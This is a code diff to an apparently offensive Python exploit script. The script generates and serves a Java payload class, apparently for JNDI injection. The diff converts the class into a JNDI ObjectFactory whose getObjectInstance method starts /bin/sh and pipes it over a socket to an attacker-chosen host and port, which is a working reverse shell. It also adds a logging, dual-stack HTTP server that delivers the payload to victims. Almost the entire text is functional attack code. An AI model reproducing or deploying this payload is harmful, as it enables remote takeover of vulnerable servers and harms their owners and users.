@@ -6,9 +6,33 @@ import subprocess
 import threading
 from pathlib import Path
 import os
+
 from http.server import HTTPServer, SimpleHTTPRequestHandler
+import socket
 
 CUR_FOLDER = Path(__file__).parent.resolve()
+
+
+class DualStackHTTPServer(HTTPServer):
+    def server_bind(self) -> None:
+        self.socket.close()
+        self.socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socket.bind(('::', self.server_address[1]))
+        self.server_address = self.socket.getsockname()
+
+class LoggingHTTPRequestHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        print(Fore.CYAN + f"[HTTP] <- {self.client_address[0]} GET {self.path}")
+        super().do_GET()
+
+    def do_HEAD(self):
+        print(Fore.CYAN + f"[HTTP] <- {self.client_address[0]} HEAD {self.path}")
+        super().do_HEAD()
+
+    def log_message(self, format, *args):
+        print(Fore.CYAN + f"[HTTP] {self.client_address[0]} - {format % args}")
 
 
 def generate_payload(userip: str, lport: int) -> None:
@@ -17,25 +41,35 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.util.Hashtable;
 
-public class Exploit {
+public class Exploit implements ObjectFactory {
 
-    public Exploit() throws Exception {
-        String host="%s";
-        int port=%d;
-        String cmd="/bin/sh";
-        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-        Socket s=new Socket(host,port);
-        InputStream pi=p.getInputStream(),
-            pe=p.getErrorStream(),
-            si=s.getInputStream();
-        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-        while(!s.isClosed()) {
-            while(pi.available()>0)
+    private static final String HOST = "%s";
+    private static final int PORT = %d;
+
+    public Exploit() {
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx,
+                                     Hashtable<?, ?> environment) throws Exception {
+        String cmd = "/bin/sh";
+        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        Socket s = new Socket(HOST, PORT);
+        InputStream pi = p.getInputStream(),
+            pe = p.getErrorStream(),
+            si = s.getInputStream();
+        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+        while (!s.isClosed()) {
+            while (pi.available() > 0)
                 so.write(pi.read());
-            while(pe.available()>0)
+            while (pe.available() > 0)
                 so.write(pe.read());
-            while(si.available()>0)
+            while (si.available() > 0)
                 po.write(si.read());
             so.flush();
             po.flush();
@@ -43,12 +77,12 @@ public class Exploit {
             try {
                 p.exitValue();
                 break;
+            } catch (Exception e) {
             }
-            catch (Exception e){
-            }
-        };
+        }
         p.destroy();
         s.close();
+        return null;
     }
 }
 """ % (userip, lport)
@@ -78,7 +112,7 @@ def payload(userip: str, webport: int, lport: int) -> None:
 
     # start the web server
     print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
-    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
+    httpd = DualStackHTTPServer(('0.0.0.0', webport), LoggingHTTPRequestHandler)
     httpd.serve_forever()
 
 
